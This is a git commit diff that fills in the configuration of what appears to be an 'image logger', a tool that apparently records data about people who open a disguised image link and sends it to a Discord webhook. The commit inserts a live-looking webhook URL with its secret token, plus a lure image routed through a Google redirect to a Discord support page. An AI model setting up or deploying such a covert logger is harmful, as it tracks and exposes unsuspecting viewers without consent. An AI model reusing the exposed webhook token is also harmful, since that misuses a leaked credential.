3bdaf731ad532775854c6d9057aab05a0ad04e0a
6Steamy <99354453+6Steamy@users.noreply.github.com>
2025-03-16 20:37:49 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1350915256763023452/QE3rc4xel63b-DUyxnXVUdKT1xmusWK1NuHXim35g3SDYh-q_ZCVNHyjyOdGRgMjFVL9",
+    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fsupport.discord.com%2Fhc%2Fpl%2Fcommunity%2Fposts%2F360060735171-Pls-fix-the-photo-bug&psig=AOvVaw0lBk1rpiuFR0XGWSVB7aMO&ust=1742240201352000&source=images&cd=vfe&opi=89978449&ved=0CBUQjRxqFwoTCLC6pcysj4wDFQAAAAAdAAAAABAE.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
